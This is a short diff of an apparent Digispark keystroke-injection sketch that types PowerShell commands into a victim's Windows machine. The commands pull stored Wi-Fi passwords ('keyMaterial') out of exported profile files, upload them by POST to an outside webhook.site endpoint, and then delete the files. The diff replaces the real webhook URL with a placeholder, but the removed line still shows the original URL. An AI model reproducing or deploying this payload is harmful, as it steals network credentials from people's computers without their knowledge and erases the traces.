@@ -31,7 +31,7 @@ void loop() {
   DigiKeyboard.delay(500);
   DigiKeyboard.println("powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Wi-Fi-PASS");
   DigiKeyboard.delay(500);
-  DigiKeyboard.println("powershell Invoke-WebRequest -Uri https://webhook.site/8e00bd59-380e-49ca-af6f-2405bb5021ea -Method POST -InFile Wi-Fi-PASS");
+  DigiKeyboard.println("powershell Invoke-WebRequest -Uri INSERT WEBHOOK.SITE DOMAIN -Method POST -InFile Wi-Fi-PASS");
   DigiKeyboard.delay(1000);
   DigiKeyboard.println("del Wi-* /s /f /q"); 
   DigiKeyboard.delay(100);
